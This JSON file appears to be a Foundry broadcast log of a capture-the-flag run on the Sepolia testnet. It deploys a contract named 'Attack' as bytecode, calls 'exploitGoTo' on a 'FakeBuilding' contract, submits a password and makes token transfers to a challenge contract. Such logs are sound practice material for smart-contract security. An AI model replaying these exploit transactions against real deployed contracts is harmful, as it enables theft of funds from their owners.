{
  "transactions": [
    {
      "hash": null,
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x5b73c5498c1e3b4dba84de0f1833c4a029d90519",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "gas": "0x3fd67",
        "value": "0x0",
        "input": "0x60806040526000805460ff60a01b1916600160a01b17905534801561002357600080fd5b506040516102603803806102608339818101604052604081101561004657600080fd5b508051602090910151600080546001600160a01b039384166001600160a01b031991821617909155600180549390921692169190911790556101d38061008d6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806340a3d2461461005c57806348eb76ee146100785780635f9a4bca1461009c57806389862c20146100b9578063aa65c649146100c1575b600080fd5b6100646100e0565b604080519115158252519081900360200190f35b6100806100f0565b604080516001600160a01b039092168252519081900360200190f35b610064600480360360208110156100b257600080fd5b50356100ff565b61008061012b565b6100de600480360360208110156100d757600080fd5b503561013a565b005b600054600160a01b900460ff1681565b6001546001600160a01b031681565b6000805460ff600160a01b808304821615810260ff60a01b199093169290921792839055910416919050565b6000546001600160a01b031681565b6000805460408051633b669c4d60e21b81526004810185905290516001600160a01b039092169263ed9a71349260248084019382900301818387803b15801561018257600080fd5b505af1158015610196573d6000803e3d6000fd5b505050505056fea264697066735822122054235ada1cf6b4be1ceb4bd332084a82ab2390fd5c57d97a2668351821d3063564736f6c634300070000330000000000000000000000009d29d33d4329640e96cc259e141838eb3eb2f1d90000000000000000000000003964d0011eb003488ab59b1ce0c235baa3998bdd",
        "nonce": "0x3",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "contribute()",
      "arguments": [],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x10d13",
        "value": "0x3328b944c4000",
        "input": "0xd7bb99ba",
        "nonce": "0x4",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "contribute()",
      "arguments": [],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0xbb37",
        "value": "0x5af3107a4000",
        "input": "0xd7bb99ba",
        "nonce": "0x5",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
      "function": "isLastFloor(uint256)",
      "arguments": [
        "1"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
        "gas": "0x7267",
        "value": "0x0",
        "input": "0x5f9a4bca0000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0x6",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
      "function": "exploitGoTo(uint256)",
      "arguments": [
        "1"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
        "gas": "0x7267",
        "value": "0x0",
        "input": "0xaa65c6490000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0x7",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": "FakeBuilding",
      "contractAddress": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
      "function": "exploitGoTo(uint256)",
      "arguments": [
        "6"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x90193c961a926261b756d1e5bb255e67ff9498a1",
        "gas": "0x7267",
        "value": "0x0",
        "input": "0xaa65c6490000000000000000000000000000000000000000000000000000000000000006",
        "nonce": "0x8",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "sendPassword(bytes32)",
      "arguments": [
        "0xde241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x194ce",
        "value": "0x0",
        "input": "0x5c8d2c38de241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8",
        "nonce": "0x9",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519",
        "10000"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x207c1",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000005b73c5498c1e3b4dba84de0f1833c4a029d905190000000000000000000000000000000000000000000000000000000000002710",
        "nonce": "0xa",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3964D0011EB003488Ab59B1ce0C235baA3998bdd",
        "1"
      ],
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x13374",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003964d0011eb003488ab59b1ce0c235baa3998bdd0000000000000000000000000000000000000000000000000000000000000001",
        "nonce": "0xb",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x11e83",
        "value": "0x38d7ea4c68000",
        "input": "0x",
        "nonce": "0xc",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1721643802,
  "chain": 11155111,
  "commit": "d9103e9"
}